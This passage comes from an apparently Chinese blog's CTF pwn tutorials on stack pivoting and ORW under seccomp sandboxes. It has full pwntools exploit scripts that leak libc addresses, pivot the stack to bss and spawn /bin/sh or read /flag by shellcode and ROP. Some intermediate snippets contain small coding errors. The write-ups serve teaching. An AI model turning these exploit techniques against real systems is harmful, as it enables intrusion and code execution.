<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp_addr = ebp_addr - 0x38    #这是我们迁移的位置(迁移到栈顶)</span><br><span class="line">binsh_addr = ebp_addr - 0x28    #这是我们写入的binsh距离ebp的位置</span><br></pre></td></tr></table></figure>

<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,26904)</span><br><span class="line">elf = ELF(&#x27;./ciscn_2019_es_2&#x27;)</span><br><span class="line"></span><br><span class="line">system_addr = elf.plt[&#x27;system&#x27;]</span><br><span class="line">leave_ret = 0x08048562          #0x08048562 : leave ; ret</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;a&#x27;*36 + b&#x27;bbbb&#x27;</span><br><span class="line">io.sendafter(&#x27;name?\n&#x27;,payload1)</span><br><span class="line">io.recvuntil(b&#x27;bbbb&#x27;)</span><br><span class="line">ebp_addr = u32(io.recv(4))</span><br><span class="line">success(hex(ebp_addr))</span><br><span class="line">esp_addr = ebp_addr - 0x38</span><br><span class="line">binsh_addr = ebp_addr - 0x28</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;aaaa&#x27;+ p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) + b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload2 = payload2.ljust(0x28,b&#x27;\x00&#x27;) + p32(ebp_addr-0x38) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>




<h1 id="例2：-Black-Watch-入群题-PWN1"><a href="#例2：-Black-Watch-入群题-PWN1" class="headerlink" title="例2：[Black Watch 入群题]PWN1"></a>例2：[Black Watch 入群题]PWN1</h1><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI1tCbGFjayUyMFdhdGNoJTIwJUU1JTg1JUE1JUU3JUJFJUE0JUU5JUEyJTk4XVBXTg==">https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>checksec;file，32位，开启NX保护<br><img src="/images/p1/s8.png"><br>放到IDA里面分析，栈溢出发生在vul_function的buf，溢出的长度为0x20-0x18&#x3D;0x8个字节，跟例1一样，能覆盖掉ebp和返回地址</p>
<p><img src="/images/p1/s9.png"></p>
<p>而与上题有两点不同：<br>一是没有system，所以首先要泄露libc里的函数的地址，然后用libc里的system函数和binsh字符串get shell；<br>二是这里有个变量s，她存到了程序的bss段，bss段我们可以写入0x200的数据。<strong>例1我们是把栈迁移回了栈中，这里我们要把栈迁移到bss段去。</strong><br><img src="/images/p1/s10.png"></p>
<p>所以我们的思路是，</p>
<ol>
<li><p>先泄露write函数的真实地址，然后通过计算libc的基地址拿到libc中的system函数的地址，注意write_plt之后的返回地址要返回到main函数，因为两次read不够我们完成整个利用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一次read的payload1和对应bss段中的结构 </span><br><span class="line">payload1 = b&#x27;aaaa&#x27;+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br></pre></td></tr></table></figure>
<p><img src="/images/p1/s11.png"></p>
</li>
<li><p>第二次read我们要将ebp覆盖为bss段的开头（0xa300）、返回地址覆盖为leave_ret，这样栈和bss段的变化就是这样的<br><img src="/images/p1/s12.png"><br>此时的eip实行write_plt(1,write_got,4)，泄露write函数的真实地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第二次read的payload2 </span><br><span class="line">payload2=cyclic(0x18)+p32(bss)+p32(leave_ret) </span><br></pre></td></tr></table></figure></li>
</ol>
<p>这样我就可以拿到了write函数的真实地址，可以计算出system和binsh的地址。<br>3. 在write函数执行完之后，我们的程序会回到main函数，继续第三次read，此时我们在bss段放入system和binsh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第三次read的payload3 </span><br><span class="line">payload3=&#x27;aaaa&#x27;+p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr)</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>来到第四次read，将ebp覆盖为3中bss段的开头（0xa300）、返回地址覆盖为leave_ret，执行我们第3步在bss段布置的system(‘&#x2F;bin&#x2F;sh’)</li>
</ol>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,28739)</span><br><span class="line">elf = ELF(&#x27;./spwn&#x27;)</span><br><span class="line"></span><br><span class="line"># 第一次read</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">payload1 = b&#x27;aaaa&#x27; + p32(write_plt) + p32(main_addr) +  p32(1) + p32(write_got) + p32(4)</span><br><span class="line">io.sendafter(b&#x27;What is your name?&#x27;,payload1)</span><br><span class="line"></span><br><span class="line"># 第二次read</span><br><span class="line">bss = 0x0804A300</span><br><span class="line">leave_ret = 0x08048511</span><br><span class="line">payload2 = cyclic(0x18)+p32(bss)+p32(leave_ret)</span><br><span class="line">io.sendafter(b&#x27;What do you want to say?&#x27;,payload2)</span><br><span class="line">write_addr = u32(io.recv(4))</span><br><span class="line">success(hex(write_addr))</span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line"># 第三次read</span><br><span class="line">payload3 = b&#x27;aaaa&#x27; + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)</span><br><span class="line">io.sendafter(b&#x27;What is your name?&#x27;,payload3)</span><br><span class="line"></span><br><span class="line"># 第四次read</span><br><span class="line">payload4 = cyclic(0x18)+p32(bss)+p32(leave_ret)</span><br><span class="line">io.sendafter(b&#x27;What do you want to say?&#x27;,payload4)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈迁移</tag>
        <tag>ciscn_2019_es_2</tag>
        <tag>Black Watch 入群题-PWN1</tag>
      </tags>
  </entry>
  <entry>
    <title>栈上ORW学习总结</title>
    <url>/posts/1d47/</url>
    <content><![CDATA[<h1 id="前置知识：沙箱保护和ORW"><a href="#前置知识：沙箱保护和ORW" class="headerlink" title="前置知识：沙箱保护和ORW"></a>前置知识：沙箱保护和ORW</h1><h2 id="沙箱保护-SandBox"><a href="#沙箱保护-SandBox" class="headerlink" title="沙箱保护 SandBox"></a>沙箱保护 SandBox</h2><p>正常情况下，程序可以使用所有的syscall，但其实这是不安全的，我们可以劫持程序流后通过execve的syscall来getshell。<br>如果不想让程序去执行execve，我们可以这样做：将程序放入一个沙箱中，在这个沙箱中添加一条规则——禁用execve函数。在这个沙箱中的程序只要调用了execve的系统调用，直接给他中断掉，这就是沙箱sandbox的作用。</p>
<p>SandBox的实现一般有两种，一种是<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=">seccomp()函数调用<i class="fa fa-external-link-alt"></i></span>，另一种是<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0ODQ2MzI0L2FydGljbGUvZGV0YWlscy8xMjE3MzE2NDA=">prctl()函数调用<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>

<h2 id="沙箱检测"><a href="#沙箱检测" class="headerlink" title="沙箱检测"></a>沙箱检测</h2><p>首先安装seccomp-tools</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>
<p>工具用法：seccomp-tools dump “程序”<br><img src="/./images/p2/image-1.png"><br>可以看到程序如果调用了execve或execveat，会跳转到0004，然后被KILL掉，也就是程序禁用了execve和execveat <strong>（system函数实质上也是调用了execve函数，所以也禁用了system函数）</strong> </p>
<h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>想想我们以前是怎么拿到flag的？我们是先get shell，然后在shell中去执行我们想要的操作（cat &#x2F;flag），但如果程序禁用了execve，能不能跳过get shell的步骤，去直接拿到flag呢？</p>
<p>这就是ORW（open,read,write）的攻击方式：open打开目标的flag文件，read读取flag文件，write显示flag文件的内容。</p>
<p><strong>open()：打开文件</strong></p>
<blockquote>
<p>函数原型：int open(char <em>path,int access);<br>char <em>path——要打开的包含路径的文件名<br>int access——打开方式(只读模式、只写模式 、读写模式)——**设为0-只读模式</em></em><br>返回值： 成功  返回fd ，失败  返回-1</p>
</blockquote>
<p><strong>read()：读取文件内容</strong></p>
<blockquote>
<p>函数原型： int read(int fd,void <em>buf,int len);<br>int fd——文件描述符——*<em>设为open的返回值fd，一般为3，表示从打开的文件中读取内容</em></em><br>void *buf——为要将读取的内容保存的缓冲区<br>int len——读取文件的长度<br>返回值：返回实际读取的字节数</p>
</blockquote>
<p><strong>write()：写文件</strong></p>
<blockquote>
<p>函数原型： int write(int fd,void <em>buf,int len);<br>int fd——文件描述符——*<em>设为1,表示写</em></em><br>void *buf——要写入的内容<br>int len——要写入的长度<br>返回值：返回实际写入文件内容的长度</p>
</blockquote>
<p>栈上的orw根据利用方式分为orw_shellcode型和orw_ROP型，通过两个例题入手</p>
<h1 id="例1：ORW-shellcode-极客大挑战-2019-Not-Bad"><a href="#例1：ORW-shellcode-极客大挑战-2019-Not-Bad" class="headerlink" title="例1：ORW_shellcode [极客大挑战 2019]Not Bad"></a>例1：ORW_shellcode [极客大挑战 2019]Not Bad</h1><blockquote>
<p>题目链接：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2Vz">https://buuoj.cn/challenges<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec;file，64位，保护全关——没有开NX保护，可以在栈上写shellcode<br><img src="/./images/p2/image-2.png"><br>IDA里面看到有三个函数，并在0x123000处开辟了0x1000的<strong>可写可执行</strong>的空间<br><img src="/./images/p2/image-3.png"></p>
<p>第一个函数开启了seccomp函数，将他重命名为seccomp_init</p>
<p><img src="/./images/p2/image-4.png"><br>第二个函数是设置缓存区，不用管<br><img src="/./images/p2/image-5.png"><br>第三个函数就是我们的vuln函数了，buf这里可以看到一个明显的栈溢出，溢出长度为0x18字节<br><img src="/./images/p2/image-6.png"></p>
<p>另外我们找到了一个 jmp rsp 汇编指令的地址，这个jmp rsp到底有什么用呢？我们在后面讲一下<br><img src="/./images/p2/image-7.png"><br>既然开启了沙箱保护，那我们就用seccomp-tools看一下，可以看到函数允许了open,write,read函数，可以通过ORW的方式去获取到flag的内容<br><img src="/./images/p2/image-8.png"></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>溢出的长度只有0x18，是不够我们写入shellcode的，但是mmap为我们在0x123000开始的位置提供了很大一片空间，那么就可以用read函数在这块空间写入我们的shellcode（shellcode写什么？当然是open打开flag、read写入flag、write输出flag）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmap = 0x123000</span><br><span class="line">orw = shellcraft.open(&#x27;./flag&#x27;)        </span><br><span class="line">orw+ = shellcraft.read(3,mmap,0x100)      </span><br><span class="line">orw+ = shellcraft.write(1,mmap,0x100)</span><br><span class="line">payload = cyclic(0x20+8) + asm(shellcraft.read(0,mmap,0x100))</span><br></pre></td></tr></table></figure>
<p>这样send(payload)之后我们再send(orw)，就向mmap的空间写入了我们的shellcode，但是接下来的问题就是如何跳转到这里执行shellcode。这里就可以讲一下jmp rsp的作用</p>
<h2 id="jmp-rsp到底有什么用呢？"><a href="#jmp-rsp到底有什么用呢？" class="headerlink" title="jmp rsp到底有什么用呢？"></a>jmp rsp到底有什么用呢？</h2><p>调试看一下正常情况的vuln函数结束前后的栈结构，在leave;ret之前rsp的地址为0xddc0<br><img src="/./images/p2/image-9.png"><br>leave，将rsp移到了rbp并+8<br><img src="/./images/p2/image-10.png"><br>ret，rsp再+8<br><img src="/./images/p2/image-11.png"></p>
<p><code>rsp</code>从<code>0xddc0</code>的位置来到了<code>0xddf0</code>的位置，想象一下如果我们将<code>ret</code>覆盖为<code>jmp rsp</code>，并且在后面跟上<code>sub rsp,offset;jmp rsp</code>，那么：</p>
<ol>
<li>程序的执行流<code>rip</code>来到<code>0xddf0</code>，先执行<code>jmp rsp</code>这条指令。</li>
<li>随后<code>rip+8</code>执行下面的<code>sub rsp,offset</code></li>
<li>然后执行<code>jmp rsp</code>，<code>rip</code>来到<code>0xddf0-offset</code>。</li>
</ol>
<p>可以看到，<code>sub rsp,offset;jmp rsp</code>实际上控制了<code>eip</code>，如果我们将<code>rsp-offset</code>的值设为shellcode地址，那么自然程序就会去执行我们的shellcode了。</p>
<p>那么我们就知道该如何进行跳转了，把填充垃圾数据的部分利用起来，看看下边右图的栈结构<br><img src="/./images/p2/image-12.png"><br>在栈顶写入read(0,mmap,0x100);mov rax;0x123000;call rax，填充垃圾数据，然后将ret覆盖为jmp esp，那么rip重新指向现在的rsp的值，接下来rsp-0x30（0x30&#x3D;填充的0x28+rsp自增的8），回到绿色的那两行，这两行用来做什么的？向read读入我们的orw，并且call调用它</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(0,mmap,0x100)) +asm(&#x27;mov r15,0x123000;call r15&#x27;)</span><br><span class="line">payload = payload.ljust(0x28,b&#x27;\x90&#x27;)</span><br><span class="line">payload += p64(jmp_rsp) + asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其实call rax和jmp rax都可以，区别如下：<br>call会把他的下一条指令的地址压入堆栈，然后跳转到他调用的开始处，同时ret会自动弹出返回地址。<br>JMP只是简单的跳转<br>call的本质相当于push+jmp  ret的本质相当于pop+jmp</p>
</blockquote>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,28895)</span><br><span class="line">elf = ELF(&#x27;./bad&#x27;)</span><br><span class="line">jmp_rsp = 0x400A01</span><br><span class="line">mmap = 0x123000</span><br><span class="line">orw = shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="line">orw += shellcraft.read(3,mmap,0x100)</span><br><span class="line">orw += shellcraft.write(1,mmap,0x100)</span><br><span class="line">orw = asm(orw)</span><br><span class="line">payload = asm(shellcraft.read(0,mmap,0x100)) +asm(&#x27;mov r15,0x123000;call r15&#x27;)</span><br><span class="line">payload = payload.ljust(0x28,b&#x27;\x90&#x27;)</span><br><span class="line">payload += p64(jmp_rsp) + asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)</span><br><span class="line">io.recvline()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(orw)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="例2：ORW-ROP-HGAME-2023-week1-orw"><a href="#例2：ORW-ROP-HGAME-2023-week1-orw" class="headerlink" title="例2：ORW_ROP [HGAME 2023 week1] orw"></a>例2：ORW_ROP [HGAME 2023 week1] orw</h1><blockquote>
<p>题目链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cubnNzY3RmLmNuL3Byb2JsZW0vMzQ4OQ==">https://www.nssctf.cn/problem/3489<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>先把ld和libc链接到程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ patchelf --set-interpreter /home/kuban/Desktop/pwn/test/orw/ld-2.31.so vuln </span><br><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ patchelf --replace-needed libc.so.6 /home/kuban/Desktop/pwn/test/orw/libc-2.31.so vuln</span><br><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ ldd vuln </span><br><span class="line">        linux-vdso.so.1 (0x00007fff70b25000)</span><br><span class="line">        /home/kuban/Desktop/pwn/test/orw/libc-2.31.so (0x000076c7d729c000)</span><br><span class="line">        /home/kuban/Desktop/pwn/test/orw/ld-2.31.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x000076c7d7490000)</span><br></pre></td></tr></table></figure>

<p>checksec;file，64位，开启NX保护<br><img src="/./images/p2/image-13.png"><br>IDA里面看一下<br>main函数开启了一个沙箱，输出一行后调用vuln函数<br><img src="/./images/p2/image-14.png"><br>vuln函数就是一个非常简单的栈溢出，溢出长度有0x30个字节<br><img src="/./images/p2/image-15.png"><br>检测一下沙箱，可以看到函数禁用了execve函数<br><img src="/./images/p2/image-16.png"><br>记录一下gadget<br><img src="/./images/p2/image-17.png"></p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>这道题主要有四个问题需要解决</p>
<ol>
<li><p>禁用了execve<br>解决方法：当然是orw啦</p>
</li>
<li><p>程序没有open、write函数<br>解决方法：用puts泄露libc，在libc中找到open,write并且返回到vuln函数继续下一步的利用</p>
</li>
<li><p>栈溢出长度只有0x28，不够写入ROP链<br>解决方法：利用leave_ret gadget将栈迁移到bss段<br><img src="/./images/p2/image-18.png"></p>
</li>
<li><p>我们open之后，read和write要用到rdi,rsi和rdx三个寄存器传参，可是我们没有控制rdx的gadget？<br>解决办法：使用libc里面的rsi和rdx，libc_base+[libc_rsi&#x2F;rdx] 就可以了（具体看一下exp应该就懂了）<br><img src="/./images/p2/image-19.png"></p>
<blockquote>
<p>其实对于问题3，我们也可以在libc中找到pop rsp的指令实现栈迁移，大家伙儿感兴趣可以试试</p>
</blockquote>
</li>
</ol>
<p>那么我们就可以分三步走<br>第一步：泄露libc，找到open,write并且返回到vuln函数，为第二步中read的buf迁移做准备。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop_rdi = 0x401393</span><br><span class="line">ret = 0x40101a</span><br><span class="line">leave_ret = 0x4012be</span><br><span class="line">libc_dump_rsi = 0x2601f</span><br><span class="line">libc_dump_rdx = 0x142c92</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(0x100+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">io.sendafter(&#x27;before you try to solve this task.&#x27;,payload1)</span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">success(hex(puts_addr))</span><br></pre></td></tr></table></figure>
<p>计算libc基地址，写出目标中我们需要的函数和gadget的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">open_addr = libc_base + libc.symbols[&#x27;open&#x27;]</span><br><span class="line">read_addr = libc_base + libc.symbols[&#x27;read&#x27;] # read_addr = elf.plt[&#x27;read&#x27;]</span><br><span class="line">write_addr = libc_base + libc.symbols[&#x27;write&#x27;]</span><br><span class="line">pop_rsi = libc_base + libc_dump_rsi</span><br><span class="line">pop_rdi = libc_base + libc_dump_rdi</span><br></pre></td></tr></table></figure>

<p>第二步：第一步完成后程序回到了vuln函数即将执行read(0, buf, 0x130uLL); 看一下汇编，可以看到这个read 写入的位置在 rbp-0x100 的位置<br><img src="/./images/p2/image-20.png"></p>
<p>我们想要向bss段写入我们的orw，那么我们可以将rbp迁移到newrbp&#x3D;bss+0x200的位置，read就会向newrbp-0x100的位置写入数据了，我们的payload2这样构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newrbp = elf.bss(0x200)</span><br><span class="line">payload2 = cyclic(0x100) + p64(newrbp) + p64(?)</span><br></pre></td></tr></table></figure>

<p>返回地址填什么？填vuln就错了，我们得直接去找到执行read(0, buf, 0x130uLL)的指令，才能向newrbp-0x100的位置写入ROP<br><img src="/./images/p2/image-21.png"></p>
<p>这个指令在0x4012CF，我们可以写成vuln+0xF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newrbp = elf.bss(0x200)</span><br><span class="line">payload2 = cyclic(0x100) + p64(newrbp) + p64(vuln_addr + 0xF)</span><br><span class="line">io.sendline(payload2)</span><br></pre></td></tr></table></figure>

<p>第三步：现在就是往我们的newbrp-0x100的位置写入flag和orw(flag)，最后将rbp覆盖为bss，返回地址覆盖为leave_ret，完成栈的迁移，执行ROP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload3 = b&#x27;/flag&#x27;.ljust(8,b&#x27;\x00&#x27;)</span><br><span class="line">payload3 += p64(pop_rdi) + p64(newrbp-0x100) +p64(pop_rsi) + p64(0) + p64(open_addr)    # open</span><br><span class="line">payload3 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(elf.bss(0x400)) + p64(pop_rdx) + p64(0x100) + p64(read_addr)     # read</span><br><span class="line">payload3 += p64(pop_rdi) + p64(1) + p64(write_addr)     #write    #复用我们的rsi和rdx，不用重新pop了</span><br><span class="line"># payload3 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x404500) + p64(pop_rdx) + p64(0x100) + p64(write_addr)</span><br><span class="line">payload3 = payload3.ljust(0x100,b&#x27;\x00&#x27;) + p64(newrbp-0x100) + p64(leave_ret)</span><br><span class="line">io.sendline(payload3)</span><br></pre></td></tr></table></figure>

<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;DEBUG&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">io = remote(&#x27;node5.anna.nssctf.cn&#x27;,21109)</span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line">pop_rdi = 0x401393</span><br><span class="line">ret = 0x40101a</span><br><span class="line">leave_ret = 0x4012be</span><br><span class="line">libc_dump_rsi = 0x2601f</span><br><span class="line">libc_dump_rdx = 0x142c92</span><br><span class="line">vuln_addr = 0x4012C0</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(0x100+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">io.sendlineafter(&#x27;before you try to solve this task.&#x27;,payload1)</span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">open_addr = libc_base + libc.symbols[&#x27;open&#x27;]</span><br><span class="line"># read_addr = libc_base + libc.symbols[&#x27;read&#x27;]         </span><br><span class="line">read_addr = elf.plt[&#x27;read&#x27;]</span><br><span class="line">write_addr = libc_base + libc.symbols[&#x27;write&#x27;]</span><br><span class="line">pop_rsi = libc_base + libc_dump_rsi</span><br><span class="line">pop_rdx =  libc_base + libc_dump_rdx</span><br><span class="line"></span><br><span class="line">newrbp = elf.bss(0x200)</span><br><span class="line">payload2 = cyclic(0x100) + p64(newrbp) + p64(vuln_addr + 0xF)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = b&#x27;/flag&#x27;.ljust(8,b&#x27;\x00&#x27;)</span><br><span class="line">payload3 += p64(pop_rdi) + p64(newrbp-0x100) +p64(pop_rsi) + p64(0) + p64(open_addr)        # open</span><br><span class="line">payload3 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(elf.bss(0x400)) + p64(pop_rdx) + p64(0x100) + p64(read_addr)         # read</span><br><span class="line">payload3 += p64(pop_rdi) + p64(1) + p64(write_addr)          #write</span><br><span class="line"># payload3 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x404500) + p64(pop_rdx) + p64(0x100) + p64(write_addr)</span><br><span class="line">payload3 = payload3.ljust(0x100,b&#x27;\x00&#x27;) + p64(newrbp-0x100) + p64(leave_ret)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ORW</tag>
        <tag>极客大挑战_2019_Not_Bad</tag>
        <tag>HGAME_2023_week1_orw</tag>
      </tags>
  </entry>
</search>
